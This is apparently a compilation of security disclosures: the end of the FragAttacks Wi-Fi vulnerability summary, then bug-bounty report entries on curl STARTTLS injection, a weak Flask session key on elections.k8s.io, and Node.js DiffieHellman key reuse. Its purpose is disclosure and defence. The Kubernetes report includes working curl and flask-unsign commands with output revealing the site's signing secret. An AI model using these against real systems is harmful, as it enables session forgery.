+- [CVE-2020-26145](https://nvd.nist.gov/vuln/detail/CVE-2020-26145): Accepting plaintext broadcast fragments as full frames. This allows trivial packet injection. All tested network cards on **NetBSD and FreeBSD access points** were vulnerable. On a Linux client, only the TWFM-B003D network card was vulnerable.
+
+- [CVE-2020-26144](https://nvd.nist.gov/vuln/detail/CVE-2020-26144): Accepting plaintext A-MSDU frames that start with an RFC1042 header with EtherType EAPOL. This allows trivial packet injection. On a Linux client, the AWUS036ACH and TWFM-B003D network cards were vulnerable. All 6 tested **FreeBSD** network cards were vulnerable (both as clients and access points).
+
+
+# Other implementation vulnerabilities
+
+- [CVE-2020-26139](https://nvd.nist.gov/vuln/detail/CVE-2020-26139): the access point forwards EAPOL frames even if the client isn't yet authenticated. This allows an adversary to perform the aggregation attack (see below) against any client by simply being within radio range (i.e. no social engineering needed). All **NetBSD and FreeBSD access points** were vulnerable, as were two out of four Linux-based home routers.
+
+- [CVE-2020-26146](https://nvd.nist.gov/vuln/detail/CVE-2020-26146): reassembling encrypted fragments with non-consecutive packet numbers. This can be abused to exfiltrate data, under the condition that another device sends fragmented frames. All tested open source Wi-Fi implementations were vulnerable (FreeBSD, NetBSD, FullMAC Linux drivers) except SoftMAC Linux drivers.
+
+- [CVE-2020-26147](https://nvd.nist.gov/vuln/detail/CVE-2020-26147): reassembling mixed encrypted/plaintext fragments. The impact ranges from data exfiltration to packet injection, under the condition that another device sends fragmented frames. All open source Wi-Fi implementations were vulnerable (Linux, FreeBSD, NetBSD, Linux, etc).
+
+- [CVE-2020-26142](https://nvd.nist.gov/vuln/detail/CVE-2020-26142): processing fragmented frames as full frames. This can be abused to inject packets, under the condition that the another device sends fragmented frames, and in most cases requires (minor) social engineering. Among open source platforms, only OpenBSD was vulnerable.
+
+- [CVE-2020-26141](https://nvd.nist.gov/vuln/detail/CVE-2020-26141): not verifying the TKIP MIC of fragmented frames. This can be abused to exfiltrate and inject packets in old WPA1 networks. On Linux, only the NWD6505 and AWUS036ACM network cards were vulnerable.
+
+
+# Design flaws
+
+1. [Aggregation Attack](https://www.fragattacks.com/#aggregationattack) (CVE-2020-24588): the A-MSDU flag in the plaintext Wi-Fi header is not authenticated. This can be abused, usually in combination with minor social engineering, to inject arbitrary packets to a victim. All 802.11n-compatible open source implementations were vulnerable (Linux, FreeBSD, OpenBSD, etc).
+
+2. [Mixed Key Attack](https://www.fragattacks.com/#mixedkeyattack) (CVE-2020-24587): a receiver will reassemble fragments that were decrypted using different keys. Under very rare conditions this can be abused to exfiltrate data. All open source Wi-Fi implementations were vulnerable (FreeBSD, NetBSD, Linux, etc) except OpenBSD because it doesn't support fragmentation.
+
+3. [Fragment Cache Attack](https://www.fragattacks.com/#fragcacheattack) (CVE-2020-24586): a receiver will not clear fragments from memory when reconnecting or reassociating to a Wi-Fi network. Under the right conditions this can be abused to exfiltrate data. Under very rare conditions it can also be abused to inject arbitrary packets towards clients. Most open source Wi-Fi implementations were vulnerable (FreeBSD, Linux, etc) with the exception of OpenBSD and NetBSD.
+
+## Impact
+
+As indicated above, there are two impacts:
+
+1. **Arbitrary packet injection**: this clearly breaks the security of Wi-Fi. A first practical example is that this can be abused to make a client use a malicious DNS server to subsequently intercept all traffic (and perform SSL stripping attacks). As second practical example, the adversary can abuse packet injection to "punch holes in the NAT" to then directly attack internal devices (e.g. exploit internet-of-things devices or exploit BlueKeep against outdated Windows 7 machines). See [this addendum](https://papers.mathyvanhoef.com/fragattacks-overview.pdf) for the technical details or [watch three demos](https://www.youtube.com/watch?v=88YZ4061tYw).
+
+2. **Data exfiltration**: this is only possible if another device sends fragmented frames. In practice this is rare unless Wi-Fi 6 is used. Additionally, the data can only be exfiltrated if no higher-layer encryption is used (i.e. TLS will prevent data exfiltration).
+
+
+Finally, I've also contributed patches to these open source projects:
+
+- [Linux](https://lwn.net/ml/linux-wireless/20210511200110.30c4394bb835.I5acfdb552cc1d20c339c262315950b3eac491397@changeid/): I wrote patches to prevent all attacks. Additional defense-in-depth and driver-specific patches were added by Linux developers.
+
+- [Wi-Fi standard](https://mentor.ieee.org/802.11/dcn/21/11-21-0816-00-000m-on-a-msdu-addressing.docx): I'm helping to update the 802.11 standard to fix the design flaws (starting with A-MSDU fixes).
+
+- [FreeBSD](https://bugs.freebsd.org/bugzilla/buglist.cgi?quicksearch=ALL%20reporter%3Avanhoef): I wrote patches to mitigate vulnerabilities in FreeBSD. These patches are now under review [[1](https://reviews.freebsd.org/D30665), [2](https://reviews.freebsd.org/D30664), [3](https://reviews.freebsd.org/D30663)].
+
+- [NetBSD](https://gnats.netbsd.org/cgi-bin/query-pr-single.pl?number=56204): I submitted initial patches. The remaining patches are in progress.
+
+- [OpenBSD](https://github.com/openbsd/src/commit/e12e039eea57d78605e08542b570756b41a2a610): I reviewed patches related to A-MSDU vulnerabilities resulting in more secure patches.
+
+===== #1250306 · [Java]: CWE 295 - Insecure TrustManager - MiTM
+   program: github-security-lab · bounty: 1800.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1264781 · [Java]: CWE 295 - Insecure TrustManager - MiTM
+   program: github-security-lab · bounty: 1500.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1329260 · Java: Static initialization vector
+   program: github-security-lab · bounty: 1800.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1334763 · CVE-2021-22947: STARTTLS protocol injection via MITM
+   program: curl · bounty: None · module: tls-starttls-legacy-protocol · full-body
+--- BODY ---
+## Summary:
+A man-in-the-middle can inject cleartext forged responses to future encrypted commands  by pipelining them to the STARTTLS response.
+
+## Steps To Reproduce:
+Use the attached test case within the curl test system. It is based on IMAP FETCH with explicit TLS. Upon test failure, the downloaded file contains "You've been hacked!" rather than the requested mail.
+
+## Impact
+
+Mailbox content forgery (IMAP, POP3).
+Sent mail content forgery (SMTP).
+
+===== #1387366 · elections.k8s.io uses weak session secret key, may place elections at risk
+   program: kubernetes · bounty: 250.0 · module: cert-validation-weak-secrets-insecure-channel · full-body
+--- BODY ---
+## Summary
+Hi there, I have been working on a new tool to detect misconfigured session signing across bug bounty programs, called CookieMonster. Many applications use stateless cookies to preserve session information (i.e. who has logged in), but many applications do not properly secure this. @nagli and I discovered that `elections.k8s.io` uses a weak Flask SECRET_KEY, literally the string `N/A`, to sign authentication cookies.
+
+In many applications, this allows the complete compromise of the application, as you can manipulate who you are logged in as. This would be especially problematic for an election voting system. It seems, in the case of Elekto, this may not be the case as the GitHub OAuth token is injected into the session instead of a user ID, which would be hard to obtain for another user. However, this may enable weird attacks like using cross-origin request forgery with the voting or authentication flows, as we would be able to manipulate the session which contains these tokens.
+
+Note the warning from [the Elekto source](https://github.com/elekto-io/elekto/blob/48573733858aace5bec38ee9dc73e45163518346/config.py) (this is what you have set to `N/A`):
+
+```python
+# Encryption Key
+#
+# This is used by the Flask server and should be set to a random character
+# string, please do not deploy before doing this!.
+SECRET_KEY = env('APP_KEY', 'test')
+```
+
+## PoC
+As CookieMonster is not yet public, you can also use `Flask-Unsign` (`pip3 install flask-unsign[wordlist]`) to validate this:
+```
+% curl https://elections.k8s.io -Is | grep cookie
+set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.YX-V3g.NET76NNJbweb_qagyfYl2_7TDJg; Expires=Thu, 02 Dec 2021 07:23:10 GMT; HttpOnly; Path=/
+
+% flask-unsign -u -c "eyJfcGVybWFuZW50Ijp0cnVlfQ.YX-V3g.NET76NNJbweb_qagyfYl2_7TDJg"
+[*] Session decodes to: {'_permanent': True}
+[*] No wordlist selected, falling back to default wordlist..
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 8192 attemptspdcQHNyXaB0O
+'N/A'
+```
+
+## Impact
+
+Weak secret likely allows arbitrary session manipulation
+
+===== #1481247 · Java: An experimental query for ignored hostname verification
+   program: github-security-lab · bounty: 1800.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1484086 · [C#] CWE-759: Query to detect password hash without a salt
+   program: github-security-lab · bounty: 1800.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1490400 · Python: CWE-338 insecureRandomness
+   program: github-security-lab · bounty: 1800.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1567588 · [Java]: CWE-321 - Query to detect hardcoded JWT secret keys
+   program: github-security-lab · bounty: 1800.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1710575 · [CPP]: Add query for CWE-297: Improper Validation of Certificate with Host Mismatch
+   program: github-security-lab · bounty: 1800.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #2038484 · DiffieHellman doesn't generate keys after setting a key
+   program: ibb · bounty: 1800.0 · module: crypto-primitives-oracles-signatures · full-body
+--- BODY ---
+DiffieHellman doesn't generate keys after setting a key
+
+## Steps To Reproduce:
+
+  1. Instantiate: `const dh = crypto.createDiffieHellman(1024);`
+  2. Set private key: 
+```
+//set private key to 2
+dh.setPrivateKey(Buffer.from("02", 'hex'));        
+//outputs 02 (as expected)
+console.log(dh.getPrivateKey().toString('hex'));  
+```
+  3. Generate random private key:
+```
+//generate random private key
+dh.generateKeys();                                 
+//outputs 02: zero day.
+console.log(dh.getPrivateKey().toString('hex'));   
+```
+
+## Underlying issue:
+
+OpenSSL (https://github.com/majek/openssl/blob/master/crypto/dh/dh_key.c) doesn't generate keys when they're already instantiated: 
+
+```
+if (dh->priv_key == NULL)
+  {
+  priv_key=BN_new();
+  if (priv_key == NULL) goto err;
+  generate_new_key=1;
+  }
+else
+  priv_key=dh->priv_key;
+
+if (dh->pub_key == NULL)
+  {
+  pub_key=BN_new();
+  if (pub_key == NULL) goto err;
+  }
+else
+  pub_key=dh->pub_key;
+```
+
+node:crypto should use OpenSSL correctly. Method `generateKeys()` should re-instantiate OpenSSL before requesting a key, thereby avoiding the above.
+
+## Impact
+
+A nonce must be used just once; using a nonce more than once is a security vulnerability. As concrete examples: Forward secrecy of TLS and IND-CPA of ElGamal would be trivially lost if Node.js's DH were used as a building block. 
+
+This vulnerability is devastating to any developers that have used nodejs in accordance with documentation. Developers have chosen to fix documentation rather than code, unfortunately, nodejs is potentially introducing gaping security holes to anyone using code as original directed.
